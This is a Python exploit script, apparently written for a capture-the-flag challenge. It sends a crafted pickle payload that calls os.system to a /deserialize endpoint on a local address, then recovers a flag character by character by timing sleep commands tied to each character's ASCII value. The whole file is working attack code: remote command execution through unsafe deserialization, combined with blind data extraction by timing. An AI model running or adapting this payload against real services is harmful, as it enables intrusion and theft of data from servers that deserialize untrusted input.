import base64
import requests
import time

# 1 indexed
# will sleep for the ascii value - the given ofset
def sub_str(start, end):
    with open("substr.sh", mode="rb") as f:
        file = f.read().strip()
    file += b' '
    file += str(start).encode() + b' ' + str(end).encode()
    return (file)

# 1 indexed
def sleep_ascii(idx):
    file = sub_str(idx, idx)
    file = file + b" | od -An -tuC | awk '{$1=$1; print}' | cut -d' ' -f1"
    file = b'sleep $(' + file + b')'
    return file

# 1 indexed
# will sleep for the ascii value - the given ofset
def sleep_ascii_offset(idx, offset):
    file = sub_str(idx, idx)
    file += b" | od -An -tuC | awk '{$1=$1; print}' | cut -d' ' -f1"
    file = b'expr $( ' + file + b' ) - ' + str(offset).encode()
    file = b'sleep $(' + file + b')'
    return file

# file is the bash generated bash code
def send_file(file):
    payload = b"cos\nsystem\n(S'" + file + b"'\ntR"
    exploit = base64.b64encode(payload).decode()
    form = {
            'data': exploit
    }
    start_time = time.time()
    r = requests.post("http://172.18.0.2:3002/deserialize", data=form)
    end_time = time.time()
    elapsed_time = end_time - start_time
    print(f"Request took {elapsed_time:.1f} seconds")
    print(r.status_code)
    print(r.text)
    return elapsed_time

def get_flag_len():
    return 24 #idk broke but i got the length before it broke
    with open('srcipt_len_back.sh', mode='rb') as f:
        file = f.read()

    print(f"script : {file.decode()}")
    flag_len = int(send_file(file))
    print(f"flag_len: {flag_len}")
    return (flag_len)



flag_len = get_flag_len()

flag = ""
for i in range(1, flag_len + 1):
    file = sleep_ascii_offset(i, 33)
    print(f"script : {file.decode()}")
    runtime = send_file(file)
    flag += chr(int(runtime + 33))
    print(f"cur flag: {flag}")

print(f"finished flag: {flag}")




